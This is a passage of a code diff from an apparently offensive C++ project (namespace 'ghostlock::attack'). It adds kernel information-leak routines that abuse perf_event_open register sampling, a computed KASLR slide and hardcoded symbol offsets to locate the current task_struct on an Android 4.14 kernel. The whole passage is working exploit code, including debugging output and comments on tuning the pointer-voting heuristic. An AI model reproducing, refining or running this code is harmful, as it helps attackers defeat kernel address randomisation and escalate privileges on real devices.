+        pe.sample_period = 1;
+        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+        pe.sample_regs_intr = 0x3;      /* x0, x1 */
+        pe.disabled = 1;
+        pe.exclude_user = 1;
+        pe.exclude_hv = 1;
+        errno = 0;
+        support::UniqueFd fd(static_cast<int32_t>(
+            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
+        if (!fd.valid()) {
+            pr_info("[dbg] bp open failed errno=%d\n", errno);
+            kill(child, SIGKILL);
+            return 0;
+        }
+        constexpr size_t kPage = 4096;
+        constexpr size_t kSize = kPage * 16;
+        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
+        support::MappedRegion buf(mapped, kPage + kSize);
+        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
+        struct timespec nap = {.tv_sec = 0, .tv_nsec = 400000000};
+        syscall(__NR_nanosleep, &nap, nullptr);
+        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+        kill(child, SIGKILL);
+        waitpid(child, nullptr, 0);
+
+        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
+        uint64_t scan = hdr->data_tail;
+
+        uintptr_t top[6] = {};
+        int32_t topc[6] = {};
+        int64_t total = 0;
+        while (scan < head) {
+            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
+            if (ev->size == 0) break;
+            if (ev->type == PERF_RECORD_SAMPLE) {
+                char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
+                q += 8;                                  /* ip */
+                const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
+                q += 8;
+                total++;
+                if (abi == 1 || abi == 2) {
+                    for (uint64_t r = 0; r < 2; r++) {
+                        const uint64_t v = *reinterpret_cast<uint64_t *>(q + r * 8);
+                        const uintptr_t cand = static_cast<uintptr_t>(
+                            (v & 0x0000ffffffffffffULL) | 0xffff000000000000ULL);
+                        if (!cand || (cand & 7) != 0 || (cand & 0xfff) == 0) continue;
+                        if (cand < 0xffffff8000000000ULL || cand >= 0xffffff9000000000ULL) continue;
+                        for (int32_t k = 0; k < 6; k++) {
+                            if (topc[k] && top[k] == cand) { topc[k]++; break; }
+                            if (!topc[k]) { top[k] = cand; topc[k] = 1; break; }
+                        }
+                    }
+                }
+            }
+            scan += ev->size;
+        }
+        pr_info("[dbg] bp samples=%ld switch_to=%016llx\n",
+                (long) total, (unsigned long long) switch_to);
+        for (int32_t k = 0; k < 6; k++) {
+            if (topc[k]) pr_info("[dbg]   bp cand %016zx x%d\n", (size_t) top[k], topc[k]);
+        }
+        for (int32_t k = 0; k < 6; k++) if (topc[k] >= 3 && top[k]) return top[k];
+        return 0;
+    }
+
+
+    /* Original design, now that the slide is known: the child spins in
+     * getpid(), and getpid() is `mrs x0, sp_el0; bl __task_pid_nr_ns`, so any
+     * sample whose IP lands inside __task_pid_nr_ns has x0 = current.  Vote
+     * only on that register and require the winner to appear at several
+     * distinct call sites (a kernel stack pointer only shows up near one). */
+    uintptr_t perf_task_from_current_arg(void) {
+        const uint64_t slide = target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL;
+        const uint64_t pid_ns = 0xffffff800826c10cULL + slide;
+        constexpr uint64_t kPidNsLen = 0x400ULL;
+
+        pr_info("[dbg] arg enter\n");
+        int32_t pipefd[2];
+        if (pipe(pipefd) != 0) return 0;
+        const pid_t child = fork();
+        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
+        if (child == 0) {
+            close(pipefd[0]);
+            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
+            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
+            (void) ignored;
+            close(pipefd[1]);
+            for (;;) syscall(__NR_sched_yield);
+        }
+        close(pipefd[1]);
+        pid_t tid = 0;
+        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
+            close(pipefd[0]); kill(child, SIGKILL); return 0;
+        }
+        close(pipefd[0]);
+
+        struct perf_event_attr pe{};
+        pe.type = PERF_TYPE_SOFTWARE;
+        pe.size = sizeof(pe);
+        pe.config = PERF_COUNT_SW_CPU_CLOCK;
+        {
+            const char *per = getenv("GHOSTLOCK_ARG_PERIOD");
+            pe.sample_period = per ? strtoull(per, nullptr, 0) : 2000ULL;
+        }
+        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+        pe.sample_regs_intr = 0x1;      /* x0 only: smaller records, more samples */
+        pe.disabled = 1;
+        pe.exclude_user = 1;
+        pe.exclude_hv = 1;
+        pe.exclude_idle = 1;
+        support::UniqueFd fd(static_cast<int32_t>(
+            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
+        pr_info("[dbg] arg perf fd ok=%d\n", (int) fd.valid());
+        if (!fd.valid()) { kill(child, SIGKILL); return 0; }
+        constexpr size_t kPage = 4096;
+        constexpr size_t kSize = kPage * 256;
+        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
+        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
+        support::MappedRegion buf(mapped, kPage + kSize);
+        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
+        struct timespec nap = {.tv_sec = 0, .tv_nsec = 400000000};
+        syscall(__NR_nanosleep, &nap, nullptr);
+        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
+        pr_info("[dbg] arg sampled, stopping child\n");
+        kill(child, SIGKILL);
+        waitpid(child, nullptr, 0);
+        pr_info("[dbg] arg child reaped\n");
+
+        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
+        const uint64_t head = hdr->data_head;
+        std::atomic_thread_fence(std::memory_order_acquire);
+        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
+        uint64_t scan = hdr->data_tail;
+
+        struct Cand { uintptr_t v; int32_t votes; uint64_t sites; };
+        Cand top[6]{};
+        int64_t in_range = 0;
+        int64_t total = 0;
+        while (scan < head) {
+            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
+            if (ev->size == 0) break;
+            if (ev->type == PERF_RECORD_SAMPLE) {
+                char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
+                const uint64_t ip = *reinterpret_cast<uint64_t *>(q);
+                q += 8;
+                const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
+                q += 8;
+                total++;
+                if (ip >= pid_ns && ip < pid_ns + kPidNsLen && (abi == 1 || abi == 2)) {
+                    in_range++;
+                    const uint64_t raw = *reinterpret_cast<uint64_t *>(q);
+                    const uintptr_t cand = static_cast<uintptr_t>(
+                        (raw & 0x0000ffffffffffffULL) | 0xffff000000000000ULL);
+                    if ((cand & 0xffffffffULL) >= 0xffff0000ULL) continue;
+                    if ((cand & 7) != 0) continue;
+                    const auto site = static_cast<uint64_t>(((ip - pid_ns) >> 3) & 63);
+                    for (int32_t k = 0; k < 6; k++) {
+                        if (top[k].votes && top[k].v == cand) {
+                            top[k].votes++;
+                            top[k].sites |= 1ULL << site;
+                            break;
+                        }
+                        if (!top[k].votes) {
+                            top[k].v = cand;
+                            top[k].votes = 1;
+                            top[k].sites = 1ULL << site;
+                            break;
+                        }
+                    }
+                }
+            }
+            scan += ev->size;
+        }
+        pr_info("[dbg] arg samples=%ld in_pid_ns=%ld\n", (long) total, (long) in_range);
+        uintptr_t best = 0;
+        int32_t best_sites = 0;
+        for (int32_t k = 0; k < 6; k++) {
+            if (!top[k].votes) continue;
+            const int32_t sites = __builtin_popcountll(top[k].sites);
+            pr_info("[dbg]   arg cand %016zx x%d sites=%d\n",
+                    (size_t) top[k].v, top[k].votes, sites);
+            if (sites > best_sites) { best_sites = sites; best = top[k].v; }
+        }
+        return best_sites >= 2 ? best : 0;
+    }
+
     uintptr_t perf_find_task(void) {
+        {
+            const uintptr_t via_arg = perf_task_from_current_arg();
+            if (via_arg) {
+                pr_info("perf task (arg): 0x%016zx\n", (size_t) via_arg);
+                return via_arg;
+            }
+        }
+        if (getenv("GHOSTLOCK_PERF_BP")) {
+            const uintptr_t via_bp = perf_task_breakpoint_probe();
+            if (via_bp) {
+                pr_info("perf task (bp): 0x%016zx\n", (size_t) via_bp);
+                return via_bp;
+            }
+        }
+        if (getenv("GHOSTLOCK_PERF_SWITCH")) {
+            const uintptr_t via_switch = perf_task_switch_probe();
+            if (via_switch) {
+                pr_info("perf task (switch): 0x%016zx\n", (size_t) via_switch);
+                return via_switch;
+            }
+        }
+        {
+            const uintptr_t sleeping = perf_find_task_sleeping();
+            if (sleeping) {
+                pr_info("perf task (sleeping): 0x%016zx\n", (size_t) sleeping);
+                return sleeping;
+            }
+            const uintptr_t via_pid = perf_task_from_pid_ns();
+            if (via_pid) {
+                pr_info("perf task (pid_ns): 0x%016zx\n", (size_t) via_pid);
+                return via_pid;
+            }
+        }
         struct perf_event_attr pe{};
         pe.type = PERF_TYPE_SOFTWARE;
         pe.size = sizeof(pe);
@@ -612,9 +1503,24 @@ namespace ghostlock::attack {
                     uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                     for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                         uint64_t v = regs[i];
-                        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
-                        v |= 0x0fULL << 56;
-                        if (in_direct_map(v))
+                        /* Rebuild the canonical kernel VA instead of OR-ing in a
+                         * tag nibble. Android 5.x/6.x kernels tag kernel
+                         * pointers by randomising bits 56-59, so OR-ing 0xf<<56
+                         * was enough there; this 4.14 kernel has no tag, and the
+                         * old form turned every small negative register value
+                         * into a plausible direct-map address (0xffffffd0 ->
+                         * 0xffffff0fffffffd0), which is why the vote pool
+                         * saturated at 8192 and the winner was noise. Keeping
+                         * the low 48 bits and forcing the top 16 to 0xffff is
+                         * the identity for a real kernel pointer and rejects
+                         * anything that is not 0xffffff80..0xffffffbf. */
+                        v = (v & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
+                        /* Small negative values (error codes such as -EAGAIN)
+                         * canonicalise to 0xffffff80ffffffd0 and used to win the
+                         * vote.  A real kernel pointer keeps a wide low half;
+                         * reject the sign-extended-short form outright. */
+                        if ((v & 0xffffffffULL) >= 0xffff0000ULL) continue;
+                        if ((v & 7ULL) == 0 && in_direct_map(v))
                             cands[static_cast<size_t>(nc++)] = v;
                     }
                 }
@@ -635,6 +1541,29 @@ namespace ghostlock::attack {
             }
         }
         pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
+        {
+            /* dbg: distinct top candidates */
+            struct Entry { uintptr_t v; int32_t c; };
+            Entry top[6]{};
+            int32_t ntop = 0;
+            for (int32_t i = 0; i < nc; i++) {
+                const auto at = cands[static_cast<size_t>(i)];
+                const int32_t cnt = static_cast<int32_t>(
+                    std::count(cands.begin(), cands.begin() + nc, at));
+                bool known = false;
+                for (int32_t k = 0; k < ntop; k++) if (top[k].v == at) known = true;
+                if (known) continue;
+                if (ntop < 6) {
+                    top[ntop].v = at; top[ntop].c = cnt; ntop++;
+                } else {
+                    int32_t worst = 0;
+                    for (int32_t k = 1; k < 6; k++) if (top[k].c < top[worst].c) worst = k;
+                    if (cnt > top[worst].c) { top[worst].v = at; top[worst].c = cnt; }
+                }
+            }
+            for (int32_t k = 0; k < ntop; k++)
+                pr_info("[dbg] cand %016zx  x%d\n", (size_t)top[k].v, top[k].c);
+        }
         return best;
     }
 } // namespace ghostlock::attack
